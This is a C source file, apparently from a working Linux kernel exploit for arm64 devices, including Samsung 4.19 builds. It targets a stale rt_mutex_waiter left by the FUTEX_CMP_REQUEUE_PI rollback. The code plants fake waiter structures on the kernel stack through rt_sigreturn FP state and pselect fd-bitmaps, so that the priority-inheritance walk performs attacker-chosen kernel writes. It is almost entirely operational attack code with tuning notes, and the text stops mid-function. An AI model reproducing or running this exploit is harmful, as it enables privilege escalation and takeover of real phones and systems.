#include "common.h"

#define SLIDE_MAX_ATTEMPTS 2
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_CONSUME_USEC 0
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_PSELECT_PAD_BYTES 0
#define SLIDE_PSELECT_TIMEOUT_SEC 0
#define SLIDE_PSELECT_TIMEOUT_USEC 200000
#define SLIDE_WAIT_SECONDS 5

/* ---------------- deterministic stale-waiter plant ----------------
 *
 * The FUTEX_CMP_REQUEUE_PI rollback in remove_waiter() clears
 * current->pi_blocked_on instead of waiter->task's, so the victim returns
 * to userspace with pi_blocked_on still pointing at the rt_mutex_waiter
 * that lived in do_futex()'s kernel-stack frame.
 *
 * pselect cannot rebuild that object: core_sys_select() zeroes the whole
 * result region and do_select() early-breaks after the first ready bitmap
 * word, so only waiter.word0 is ever shaped and waiter->lock is never
 * written at all.
 *
 * The delivery primitive is rt_sigreturn: restore_fpsimd_context() copies
 * 0x200 bytes of user fpsimd state to entry_sp-0x280, so the window covers
 * [entry_sp-0x280, entry_sp-0x80).  The stale waiter on this build is at
 * entry_sp-0x270 (measured: waiter->prio is lane 10, so the base is lane 2),
 * which sits entirely inside that window.  The copy is verbatim and
 * unconditional.  adjtimex() only reaches entry_sp-0x1e8 and can never plant
 * this waiter.
 *
 * After plant_waiter() returns this thread must not enter the kernel until
 * the punch has completed: any syscall reuses that stack region.
 */
#ifdef SIGRET_WAITER_LANE

#ifndef SYS_tgkill
#define SYS_tgkill 131
#endif
#ifndef SYS_nanosleep
#define SYS_nanosleep 101
#endif

#define PLANT_LANES 64

/* Heap-free, stack-free payload: the fpsimd copy reads this
 * through a pointer, so keeping it static removes 512 bytes
 * from every caller's frame and keeps the plant window high. */
static uint64_t plant_vals[PLANT_LANES];
int plant_pad_current;
atomic_int plant_ready;

/* Post-sigreturn readback of the FP registers.  rt_sigreturn copies the 512
 * bytes of fpsimd_context into a kernel-stack local and then loads that local
 * into the FPU, so a match here proves the kernel local holds our bytes. */
uint64_t plant_fp_readback[8];
int plant_fp_mismatch = -1;

int plant_signal_tid;
int plant_pid;
volatile sig_atomic_t plant_hits;
int plant_delivery_failed;

/* Delivery evidence, read by the punch thread: this thread cannot log after
 * the plant without a syscall, which would reuse the planted stack region. */
long plant_adjtimex_ret = -1;
long plant_adjtimex_errno = -1;

static void plant_handler(int sig) {
  (void)sig;
  plant_hits++;
}

int plant_waiter_install(void) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = plant_handler;
  sigemptyset(&sa.sa_mask);
  sa.sa_flags = SA_RESTART;
  if (sigaction(PLANT_SIGNAL, &sa, NULL) != 0) {
    return 0;
  }
  plant_signal_tid = (int)syscall(SYS_gettid);
  plant_pid = (int)syscall(SYS_getpid);
  return 1;
}

/* Load q0..q31 from vals and take PLANT_SIGNAL in the same instruction
 * stream: the kernel snapshots the current fpsimd state when it builds the
 * signal frame, so no compiler-generated code can run between the load and
 * the svc.  q8..q15 are callee-saved, hence the explicit clobbers. */
static void plant_copy(const uint64_t *vals) {
  register long x0 __asm__("x0") = (long)plant_pid;
  register long x1 __asm__("x1") = (long)plant_signal_tid;
  register long x2 __asm__("x2") = (long)PLANT_SIGNAL;
  register long x8 __asm__("x8") = (long)SYS_tgkill;
  __asm__ __volatile__(
      "ldp q0,  q1,  [%[p], #0]\n\t"
      "ldp q2,  q3,  [%[p], #32]\n\t"
      "ldp q4,  q5,  [%[p], #64]\n\t"
      "ldp q6,  q7,  [%[p], #96]\n\t"
      "ldp q8,  q9,  [%[p], #128]\n\t"
      "ldp q10, q11, [%[p], #160]\n\t"
      "ldp q12, q13, [%[p], #192]\n\t"
      "ldp q14, q15, [%[p], #224]\n\t"
      "ldp q16, q17, [%[p], #256]\n\t"
      "ldp q18, q19, [%[p], #288]\n\t"
      "ldp q20, q21, [%[p], #320]\n\t"
      "ldp q22, q23, [%[p], #352]\n\t"
      "ldp q24, q25, [%[p], #384]\n\t"
      "ldp q26, q27, [%[p], #416]\n\t"
      "ldp q28, q29, [%[p], #448]\n\t"
      "ldp q30, q31, [%[p], #480]\n\t"
      "svc #0\n\t"
      : "+r"(x0)
      : [p] "r"(vals), "r"(x1), "r"(x2), "r"(x8)
      : "x3", "x4", "x5", "x6", "x7", "x9", "x10", "x11", "x12", "x13",
        "x14", "x15", "x16", "x17",
        "v0", "v1", "v2", "v3", "v4", "v5", "v6", "v7",
        "v8", "v9", "v10", "v11", "v12", "v13", "v14", "v15",
        "v16", "v17", "v18", "v19", "v20", "v21", "v22", "v23",
        "v24", "v25", "v26", "v27", "v28", "v29", "v30", "v31",
        "memory");
  /* x0 holds the tgkill result; the signal has already been delivered and
   * rt_sigreturn has already performed the 0x200-byte copy. */
  plant_adjtimex_ret = x0;
  plant_adjtimex_errno = 0;
  plant_delivery_failed = (x0 != 0);
  /* q0..q7 are caller-saved, so they still hold what sigreturn loaded. */
  /* Exactly 64 bytes: the four-pair form wrote 128 and zeroed the globals
   * that follow this array (plant_hits, plant_delivery_failed). */
  __asm__ __volatile__(
      "stp q0, q1, [%0]\n\t"
      "stp q2, q3, [%0, #32]\n\t"
      :
      : "r"(plant_fp_readback)
      : "memory");
  plant_fp_mismatch = 0;
  for (int k = 0; k < 8; k++) {
    if (plant_fp_readback[k] != vals[k]) {
      plant_fp_mismatch = k + 1;
      break;
    }
  }
}

/* Diagnostic: fill the entire 512-byte fpsimd plant region with one value.
 * Every lane then reads back as that pointer, so waiter->lock resolves to it
 * regardless of where the kernel's stale pi_blocked_on actually points. */
void plant_waiter_all(uint64_t value) {
  uint64_t *vals = plant_vals;
  for (int i = 0; i < PLANT_LANES; i++) {
    vals[i] = value;
  }
  plant_copy(vals);
}

int plant_shallow_done;

/* Plant from the futex caller's frame.  KS_PLANT_ALL fills every lane with
 * fake_lock so the walk reads our lock at ANY alignment. */
void plant_shallow(void) {
  const char *all = getenv("KS_PLANT_ALL");
  const char *one = getenv("KS_PLANT_SHALLOW");
  if (!all && !one) {
    return;
  }
  uint64_t value = one ? strtoull(one, NULL, 0)
                       : (getenv("KS_PLANT_PAGE_BASE")
                              ? (uint64_t)(fake_lock - LOCK_OFF)
                              : (uint64_t)fake_lock);

  const char *carpet = getenv("KS_PLANT_CARPET");
  if (carpet && *carpet) {
    /* Cover [0, carpet) below SP in 512-byte steps: one device cycle instead of
     * one per position.  Bytes below SP are dead stack, so earlier writes are
     * only clobbered by the syscalls we deliberately make. */
    int span = atoi(carpet);
    if (span < 512) span = 512;
    for (int off = 0; off < span; off += 512) {
      plant_pad_current = off;
      plant_waiter_all(value);
    }
    plant_pad_current = 0;
    pr_info("KS_PLANT_CARPET span=%d value=%016llx steps=%d\n", span,
            (unsigned long long)value, span / 512);
    plant_shallow_done = 1;
    return;
  }
  plant_pad_current = getenv("KS_PLANT_PAD") ? atoi(getenv("KS_PLANT_PAD")) : 0;
  pr_info("KS_PLANT_SHALLOW value=%016llx lane_all=%d pad=%s\n",
          (unsigned long long)value, all ? 1 : 0,
          getenv("KS_PLANT_PAD") ? getenv("KS_PLANT_PAD") : "0");
  if (all) {
    /* Full fake waiter at the measured base-30 lane: tree_entry is a
     * terminal node, pi_tree_entry carries the fops write triple, the lock
     * is fake_lock and the prio is deliberately unequal to p->prio so the
     * chain actually walks instead of early-returning. */
    int vprio = victim_effective_prio((int)syscall(SYS_gettid));
    pr_info("KS_PLANT_LANES base30=%d lock30=%d prio30=%d prio=%d "
            "victim_prio=%d pc=%016zx right=%016zx left=%016zx\n",
            (int)SIGRET_WAITER_LANE, (int)SIGRET_WAITER_LANE + 7,
            (int)SIGRET_WAITER_LANE + 8, FAKE_WAITER_PRIO, vprio,
            (size_t)fake_parent, (size_t)fake_right, (size_t)fake_left);
    plant_waiter_fake(fake_task, fake_lock, FAKE_WAITER_PRIO, fake_parent,
                      fake_right, fake_left);
  } else {
    plant_waiter_all(value);
  }
  plant_shallow_done = 1;
}

/* Full fake waiter: the pi_tree_entry triple carries the rb_erase/rb_insert
 * write targets, exactly like the skb/pselect payload's fake_w0.  tree_entry
 * stays a terminal node so the dequeue from the fake lock is a no-op. */
void plant_waiter_fake(uint64_t task, uint64_t lock, int prio, uint64_t pc,
                       uint64_t right, uint64_t left) {
  uint64_t *vals = plant_vals;
  memset(vals, 0, sizeof(plant_vals));

  const int base = (int)SIGRET_WAITER_LANE;
  vals[base + 0] = 1;   /* tree_entry.__rb_parent_color: terminal */
  vals[base + 1] = 0;   /* tree_entry.rb_right */
  vals[base + 2] = 0;   /* tree_entry.rb_left */
  vals[base + 3] = pc;  /* pi_tree_entry.__rb_parent_color -> write target */
  vals[base + 4] = right;
  vals[base + 5] = left;
  vals[base + 6] = task;
  vals[base + 7] = lock;
  vals[base + 8] = (uint64_t)(uint32_t)prio;
  vals[base + 9] = 0;
  plant_copy(vals);
}

void plant_waiter(uint64_t task, uint64_t lock, int prio) {
  uint64_t *vals = plant_vals;
  memset(vals, 0, sizeof(plant_vals));

  const int base = (int)SIGRET_WAITER_LANE;
  vals[base + 0] = 1;   /* tree_entry.__rb_parent_color: terminal, RB_BLACK */
  vals[base + 1] = 0;   /* tree_entry.rb_right */
  vals[base + 2] = 0;   /* tree_entry.rb_left */
  vals[base + 3] = 1;   /* pi_tree_entry.__rb_parent_color */
  vals[base + 4] = 0;   /* pi_tree_entry.rb_right */
  vals[base + 5] = 0;   /* pi_tree_entry.rb_left */
  vals[base + 6] = task;                        /* 0x30 task */
  vals[base + 7] = lock;                        /* 0x38 lock */
  vals[base + 8] = (uint64_t)(uint32_t)prio;    /* 0x40 prio */
  vals[base + 9] = 0;                           /* 0x48 deadline */
  plant_copy(vals);
}

/* Every qword carries the same priority.  rt_mutex_adjust_pi() then exits at
 * its equal-priority check no matter which lane actually overlays the stale
 * waiter, which turns "does the plant cover the waiter at all?" into a test
 * that cannot dereference a wild lock. */
void plant_waiter_uniform(uint32_t prio) {
  uint64_t *vals = plant_vals;
  for (int i = 0; i < PLANT_LANES; i++) {
    vals[i] = (uint64_t)prio;
  }
  plant_copy(vals);
}

/* Lane search: every qword carries the equal priority except [lo, hi), which
 * is zeroed.  rt_mutex_adjust_pi() compares prio before it ever reads
 * waiter->lock, so the punch panics only when the waiter's prio qword falls in
 * the zeroed window.  That turns an address question into a binary search. */
void plant_waiter_zero_range(uint32_t prio, int lo, int hi) {
  uint64_t *vals = plant_vals;
  for (int i = 0; i < PLANT_LANES; i++) {
    vals[i] = (uint64_t)prio;
  }
  for (int i = lo; i < hi && i < PLANT_LANES; i++) {
    vals[i] = 0;
  }
  plant_copy(vals);
}

#endif /* SIGRET_WAITER_LANE */

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_owner_chain_done;
static atomic_int slide_owner_stop;
static atomic_int slide_owner_lock_ok;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static atomic_int slide_consume_inflight;

int slide_pselect_waiter_shift(void) {
  const char *s = getenv("GHOSTLOCK_SLIDE_SHIFT");
  return s && *s ? atoi(s) : PSELECT_WAITER_WORD_SHIFT;
}

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return slide_pselect_waiter_shift() + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return fdset_get_word(in, word_idx);
    case 1:
      return fdset_get_word(out, word_idx);
    case 2:
      return fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

/* 4.19 pselect6 fd-bitmap (alioth 2026-09-13, Samsung 2026-10-30):
 * stack_fds at T-0x210 (core_sys_select add x19,sp,#0x50 under the
 * 0xa0+0x1c0 pselect chain).  On Samsung the requeue path is inlined into
 * do_futex (0x1e0 frame); rt_mutex_init_waiter(&rt_waiter) takes sp+0xc0
 * there, so the waiter is at T-0x70-0x1e0+0xc0 = T-0x190.
 * 4.19 core_sys_select lays out six size=40 regions:
 *   in[0,40) out[40,80) ex[80,120) res_in[120,160) res_out[160,200)
 * so the stale waiter bytes 0-39 = res_in and bytes 40-79 = res_out:
 * THE WAITER IS THE READINESS-BITMAP OUTPUT, not the input sets.  The
 * 4.19-compatible encoding therefore builds every waiter qword from
 * per-fd readiness bits: bit b of res_in word w = read-ready(fd 64w+b),
 * bit b of res_out word w = write-ready(fd 64w+b).  do_select only
 * writes res bits for fds set in the input masks, so input bit >= res
 * bit for the same fd; fd types give all four (read,write) pairs:
 *   /dev/null=(1,1) /dev/zero=(1,0) pipe-write=(0,1) blocked-pipe-read=(0,0)
 * and every fd 0..319 must stay open so max_fds keeps nfds=320 on the
 * stack path (size=40 per set).
 *
 * Both stale rb nodes use TERMINAL form: __rb_parent_color = 1 (black
 * root, no parent) and NULL children.  4.19 __rb_erase_augmented then
 * only rewrites the tree root inside the fake page and never walks up
 * an unknown kernel parent chain.  lock/prio/task stay real so the
 * chain walk reads a consistent waiter. */

/* waiter qwords encoded into res_in (bytes 0-39) / res_out (bytes 40-79) */
static uint64_t slide_waiter_in_words[5];
static uint64_t slide_waiter_out_words[5];
/* Encode a complete struct rt_mutex_waiter (0x50 bytes: see
 * WAITER_*_OFF / FAKE_WAITER_*_OFF) into the pselect readiness bitmap so
 * that its first byte lands on the stale waiter, not 8 bytes below it.
 *
 * The kernel copies `in` to res_in and `out` to res_out and then stores
 * res_in[i] = in[i] & read_ready(i), res_out[i] = out[i] & write_ready(i).
 * open_slide_selected_fds() gives every fd exactly the readiness its bits
 * ask for, so the result reproduces the encoded words byte for byte.
 * slide_pselect_put_waiter_word() applies PSELECT_WAITER_WORD_SHIFT, which
 * is what moves word 0 from res_in+0 (T-0x198) to res_in+8 (T-0x190). */
static void encode_waiter_fdsets(
    fd_set *in, fd_set *out, fd_set *ex, uint64_t task, uint64_t lock,
    int punch) {
  static const char *names[10] = {
    "tree_entry.parent_color", "tree_entry.rb_right", "tree_entry.rb_left",
    "pi_tree.parent_color", "pi_tree.rb_right", "pi_tree.rb_left",
    "task", "lock", "prio", "deadline"};
  /* The tree parents are the store primitive, not decoration: the PI walk's
   * rt_mutex_dequeue()/rt_mutex_dequeue_pi() call __rb_erase_augmented() on
   * these nodes, and that writes through __rb_parent_color into
   * `parent->rb_left/rb_right`.  A terminal node (1) therefore performs no
   * store at all, which is why the punch never wrote a byte.  The punch route
   * points both parents at fake_w0 so the first erase lands inside the
   * controlled page and its effect is visible in the SKB diff. */
  const uint64_t tree_parent = punch ? (uint64_t)fake_w0 : 1;
  /* The working Samsung 4.19 target leaves pi_tree.parent_color at 0; only
   * tree_entry.parent_color carries the page pointer.  Pointing both at
   * fake_w0 made the walk spin with IRQs off until the hardware watchdog
   * reset the phone. */
  const uint64_t pi_tree_parent = 0;
  const uint64_t words[10] = {
    tree_parent, 0, 0,                /* tree_entry */
    pi_tree_parent, 0, 0,             /* pi_tree_entry */
    task,                             /* 0x30 task */
    lock,                             /* 0x38 lock */
    (uint64_t)FAKE_WAITER_PRIO,       /* 0x40 prio */
    0,                                /* 0x48 deadline */
  };
  int words_per_set = slide_pselect_words_per_set();

  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);
  for (int w = 0; w < 10; w++) {
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w, words[w], names[w]);
  }

  for (int w = 0; w < 5; w++) {
    slide_waiter_in_words[w] = slide_pselect_get_global_word(
        in, out, ex, words_per_set, w);
    slide_waiter_out_words[w] = slide_pselect_get_global_word(
        in, out, ex, words_per_set, 5 + w);
  }
}


/* Coverage probe: every result word carries the same pointer, so whichever
 * 8-byte boundary inside the fd-set window the stale waiter starts at, its
 * lock field reads that pointer. */
static void encode_lock_cover(fd_set *in, fd_set *out, fd_set *ex,
                              uint64_t value) {
  static const char *names[10] = {
    "cover0", "cover1", "cover2", "cover3", "cover4",
    "cover5", "cover6", "cover7", "cover8", "cover9"};
  int words_per_set = slide_pselect_words_per_set();
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);
  for (int w = 0; w < 10; w++) {
    slide_pselect_put_waiter_word(in, out, ex, words_per_set, w, value,
                                  names[w]);
  }
}

void prepare_slide_select_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  /* Slide/leak route: the walk must follow the real init_task so the
   * prio copy lands in a live task_struct. */
  encode_waiter_fdsets(in, out, ex, SLIDE_INIT_TASK, fake_lock, 0);
}


/* --- pselect from the futex call depth ----------------------------------
 * All state is global so this frame stays a few words.  With SP within ~0x20
 * of the futex svc, core_sys_select's buffer at SP-0x210..SP-0x120 covers the
 * stale waiter at futex_sp-0x190. */
static fd_set depth_in, depth_out, depth_ex;
static struct timespec depth_timeout;
static int depth_high_read = -1;

int plant_fdset_at_futex_depth(void) {
  if (depth_high_read < 0) {
    int p[2];
    if (pipe(p) == 0) {
      depth_high_read = fcntl(p[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
      close(p[0]);
      close(p[1]);
    }
    if (depth_high_read < 0) {
      depth_high_read = 0;
    }
  }
  prepare_punch_select_fdsets(&depth_in, &depth_out, &depth_ex);
  open_slide_selected_fds(&depth_in, &depth_out, &depth_ex, depth_high_read);
  const char *carpet = getenv("KS_SELECT_CARPET");
  if (carpet && *carpet) {
    int span = atoi(carpet);
    for (int off = 0; off <= span; off += 128) {
      int n = off < 32 ? 32 : off;
      volatile char pad[n];
      for (int i = 0; i < n; i += 64) {
        pad[i] = 0;
      }
      __asm__ volatile("" :: "r"(pad) : "memory");
      depth_timeout.tv_sec = 0;
      depth_timeout.tv_nsec = 100000;
      pselect(PSELECT_ROUTE_NFDS, &depth_in, &depth_out, &depth_ex,
              &depth_timeout, NULL);
    }
    pr_info("KS_SELECT_CARPET span=%d steps=%d\n", span, span / 128 + 1);
  }
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&main_route_delay_usec, 0);
  atomic_store(&plant_ready, 1);
  atomic_store(&punch_consume_go, 1);
  depth_timeout.tv_sec = 3;
  depth_timeout.tv_nsec = 0;
  int r = pselect(PSELECT_ROUTE_NFDS, &depth_in, &depth_out, &depth_ex,
                  &depth_timeout, NULL);
  int e = errno;
  atomic_store(&punch_consume_go, 0);
  pr_info("inline pselect ret=%d errno=%d calls=%d success=%d\n", r, e,
          atomic_load(&consumer_calls), atomic_load(&consumer_success));
  return r;
}

void prepare_punch_select_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  if (getenv("KS_SELECT_RAW_FILL")) {
    /* The stale waiter aliases the input bitmap copy at offset ~0x30-0x50.
     * Literal 8-byte pattern, no readiness encoding needed. */
    unsigned char *b[3];
    b[0] = (unsigned char *)in;
    b[1] = (unsigned char *)out;
    b[2] = (unsigned char *)ex;
    unsigned char pat[8];
    uint64_t v = (uint64_t)fake_lock;
    if (getenv("KS_SELECT_RAW_TEXT")) {
      /* Known-mapped kernel text alias: proves whether the walk reads this
       * window at all, independent of the sprayed page. */
      v = (uint64_t)data_addr(KIMAGE_TEXT_BASE);
    }
    for (int k = 0; k < 8; k++) pat[k] = (unsigned char)(v >> (8 * k));
    for (int s_i = 0; s_i < 3; s_i++) {
      FD_ZERO((fd_set *)b[s_i]);
      for (int j = 0; j < 40; j++) b[s_i][j] = pat[j & 7];
    }
    pr_info("KS_SELECT_RAW_FILL lock=%016zx\n", (size_t)fake_lock);
    return;
  }
  if (getenv("KS_PSELECT_FILL")) {
    pr_info("KS_PSELECT_FILL lock=%016zx\\n", (size_t)fake_lock);
    encode_lock_cover(in, out, ex, (uint64_t)fake_lock);
    return;
  }
  /* Punch route: task/lock must point into the controlled page so the
   * walk reads fake_w0 via fake_task->pi_blocked_on. */
  /* Match the validated Samsung 4.19 port exactly: the shaped waiter keeps
   * the real init_task in the task slot.  A fake task_struct here changes
   * which lock the chain takes next and was never what that port used. */
  /* KS_SENTINEL_LOCK: plant a mapped lock whose +0x18 is zero, so the walk
   * takes the no-waiters branch and cannot reach +0x304.  Tests whether
   * the stack plant reaches the chain at all. */
  encode_waiter_fdsets(in, out, ex, SLIDE_INIT_TASK,
                       getenv("KS_SENTINEL_LOCK") && fake_task
                           ? fake_task : fake_lock, 1);
}

void fdset_put_bitmap_value(fd_set *set, int word, uint64_t value) {
  fdset_put_word(set, word, value);
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  exlog_protect_fd();
  /* One fd type per (read_ready, write_ready) pair encoded from the
   * waiter words; every fd 0..319 stays open so the kernel keeps
   * nfds=320 (max_fds clamp) and the stack buffer geometry. */
  int zero_fd = -1;
  int wonly_fd = -1;        /* (0,1): pipe write end, write-ready only */
  int blocked_fd = -1;      /* (0,0): empty pipe read end, never ready */
  int pipe_keep_write = -1;
  int null_fd = (int)syscall(SYS_openat, AT_FDCWD, "/dev/null", O_RDWR, 0);
  int pipe_fds[2] = {-1, -1};
  zero_fd = (int)syscall(SYS_openat, AT_FDCWD, "/dev/zero", O_RDONLY, 0);
  /* The sweep below dup2()s over fds 0..NFDS-1, which includes the
   * template fds themselves.  If a template stayed below NFDS the sweep
   * would replace it and every later dup2(template, fd) would install
   * the wrong readiness type, silently corrupting the encoded pointer
   * words.  Move both templates (and close the low copies) first. */
  ks_relocate_fd_min(&null_fd, KS_FD_PROTECT_MIN);
  ks_relocate_fd_min(&zero_fd, KS_FD_PROTECT_MIN);
  if (syscall(SYS_pipe2, pipe_fds, 0) == 0) {
    /* Keep the write end alive above NFDS so the blocked read end never
     * sees POLLHUP, and keep a write-end template for (0,1) fds. */
    pipe_keep_write = (int)fcntl(pipe_fds[1], F_DUPFD,
                                 SLIDE_PSELECT_NFDS + 64);
    wonly_fd = (int)fcntl(pipe_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 64);
    blocked_fd = (int)fcntl(pipe_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 64);
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    pipe_fds[0] = pipe_fds[1] = -1;
    if (pipe_keep_write < 0 && blocked_fd >= 0) {
      /* Without the kept write end a blocked read end would POLLHUP. */
      close(blocked_fd);
      blocked_fd = -1;
    }
    if (wonly_fd < 0 && pipe_keep_write >= 0) {
      close(pipe_keep_write);
      pipe_keep_write = -1;
    }
  }

  int stdio_backup[3] = {-1, -1, -1};
  for (int fd = 0; fd < 3; fd++) {
    stdio_backup[fd] = fcntl(fd, F_DUPFD, SLIDE_PSELECT_NFDS + 32);
  }
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (null_fd >= 0) {
      dup2(null_fd, fd);
    } else if (read_fd >= 0) {
      dup2(read_fd, fd);
    }
  }

  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    int want_read = FD_ISSET(fd, in);
    int want_write = FD_ISSET(fd, out);
    if (want_read && want_write) {
      if (null_fd >= 0) dup2(null_fd, fd);
    } else if (want_read) {
      if (zero_fd >= 0) dup2(zero_fd, fd);
    } else if (want_write) {
      if (wonly_fd >= 0) dup2(wonly_fd, fd);
    } else {
      if (blocked_fd >= 0) dup2(blocked_fd, fd);
    }
  }
  /* Restore stdio (the dup2 above may have closed fds 0-2). */
  for (int fd = 0; fd < 3; fd++) {
    if (stdio_backup[fd] >= 0) {
      dup2(stdio_backup[fd], fd);
    }
  }
  if (zero_fd >= 0) close(zero_fd);
  if (wonly_fd >= 0) close(wonly_fd);
  if (blocked_fd >= 0) close(blocked_fd);
  /* pipe_keep_write stays open above NFDS: keeps the dup2'd write ends
   * POLLOUT-clean and the blocked read ends POLLHUP-free for the
   * duration of the pselect. */
  /* null_fd stays open: it's our template fd for dup2'd copies. */
}

void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  /* The upstream PI walk addresses these sets by the pselect frame layout.
   * Keeping them on the stack is required; moving them to BSS makes the
   * kernel write land in an unrelated frame/object. */
  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_select_fdsets(&in, &out, &ex);

  int stdio_backup[3] = {-1, -1, -1};
  for (int fd = 0; fd < 3; fd++) {
    stdio_backup[fd] = fcntl(fd, F_DUPFD, SLIDE_PSELECT_NFDS + 32);
    if (stdio_backup[fd] < 0) {
      pr_warning("slide pselect stdio backup fd=%d errno=%d\n", fd, errno);
    }
  }
  open_slide_selected_fds(&in, &out, &ex, high_read);

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);
  atomic_store(&slide_consume_inflight, 0);

  struct timespec timeout = {
    .tv_sec = SLIDE_PSELECT_TIMEOUT_SEC,
    .tv_nsec = (long)SLIDE_PSELECT_TIMEOUT_USEC * 1000,
  };
  struct timespec *timeoutp = &timeout;

  pr_info("slide pselect setup shift=%d nfds=%d timeout=%d.%06ld\n",
          slide_pselect_waiter_shift(), SLIDE_PSELECT_NFDS,
          SLIDE_PSELECT_TIMEOUT_SEC, (long)SLIDE_PSELECT_TIMEOUT_USEC);
  atomic_store(&slide_consume_go, 1);
  errno = 0;

  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  /* CRITICAL: after pselect returns, the fd-bitmap data is still on the
   * kernel stack at the stale waiter's address (below SP).  Any syscall
   * (dup2/usleep/write) would overwrite it.  Busy-wait (no syscalls) for
   * the consumer to see go=1, sleep PSELECT_ENTER_DELAY, and trigger the
   * PI chain walk before touching the stack again. */
  for (volatile int spin = 0; spin < 50000000; spin++) {
    if (atomic_load(&slide_consume_calls) > 0) break;
    __asm__ volatile("yield" ::: "memory");
  }
  /* Second phase: wait for the consumer's sched_setattr to RETURN
   * (inflight back to 0) before doing any syscall that could overwrite
   * the waiter data on this thread's kernel stack. */
  for (volatile int spin = 0; spin < 50000000; spin++) {
    if (atomic_load(&slide_consume_inflight) == 0 &&
        atomic_load(&slide_consume_calls) > 0) break;
    __asm__ volatile("yield" ::: "memory");
  }
  atomic_store(&slide_consume_go, 0);

  for (int fd = 0; fd < 3; fd++) {
    if (stdio_backup[fd] >= 0) {
      dup2(stdio_backup[fd], fd);
      close(stdio_backup[fd]);
    }
  }
  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
